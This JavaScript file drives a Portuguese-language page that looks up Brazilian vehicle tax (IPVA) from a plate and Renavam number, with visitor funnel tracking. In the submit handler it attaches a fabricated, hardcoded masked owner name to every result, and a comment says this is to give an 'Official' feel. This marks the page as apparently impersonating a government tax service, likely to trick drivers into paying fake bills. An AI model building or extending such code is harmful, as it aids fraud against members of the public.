document.addEventListener('DOMContentLoaded', () => {
    // Track stage 1: Initial form page
    const urlParams = new URLSearchParams(window.location.search);
    const utmSource = urlParams.get('utm_source') || 'Direct';

    // Get or create session ID
    let sessionId = sessionStorage.getItem('session_id');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('session_id', sessionId);
    }

    // Track initial form stage
    fetch('/api/track_session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            session_id: sessionId,
            stage: 'initial_form',
            utm_source: utmSource
        })
    }).catch(e => console.error('Track error:', e));

    // Carousel Logic
    const images = document.querySelectorAll('.person-img');
    let currentIndex = 0;

    if (images.length > 0) {
        setInterval(() => {
            images[currentIndex].classList.remove('active');
            currentIndex = (currentIndex + 1) % images.length;
            images[currentIndex].classList.add('active');
        }, 4000);
    }

    // Elements
    const form = document.getElementById('consultForm');
    const plateInput = document.getElementById('plate');
    const renavamInput = document.getElementById('renavam');
    const resultOverlay = document.getElementById('resultOverlay');
    const closeResultBtn = document.getElementById('closeResult');

    // Input Masks
    plateInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
    });

    renavamInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);
    });

    // Close Modal
    closeResultBtn.addEventListener('click', () => {
        resultOverlay.classList.add('hidden');
    });

    // Helper: Parse Currency to Float
    function parseCurrency(str) {
        if (!str) return 0;
        return parseFloat(str.replace('R$', '').replace(/\./g, '').replace(',', '.').trim());
    }

    // Helper: Format Float to Currency
    function formatCurrency(val) {
        return val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }

    // Submit Handler
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const plate = plateInput.value.trim();
        const renavam = renavamInput.value.trim();

        if (plate.length < 7) {
            alert("Por favor, digite uma placa válida.");
            return;
        }
        if (renavam.length < 9) {
            alert("Por favor, digite um Renavam válido.");
            return;
        }

        const submitBtn = form.querySelector('button[type="submit"]');
        const originalBtnText = submitBtn.textContent;
        submitBtn.textContent = "CONSULTANDO...";
        submitBtn.disabled = true;

        try {
            const response = await fetch('/api/calculate_ipva', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ plate: plate })
            });

            const data = await response.json();

            if (data.error) {
                alert(`Erro: ${data.error}`);
            } else {
                // Add Meta Data
                data.renavam = renavam; // Pass the input renavam
                data.ownerName = "***** LOPES GOMES"; // Standard Masked Name for "Official" feel

                // Save to Session and Redirect
                sessionStorage.setItem('vehicleData', JSON.stringify(data));
                window.location.href = 'resultado.html?t=' + new Date().getTime();
            }

        } catch (err) {
            console.error(err);
            alert("Erro de conexão. Tente novamente.");
        } finally {
            submitBtn.textContent = originalBtnText;
            submitBtn.disabled = false;
        }
    });
});
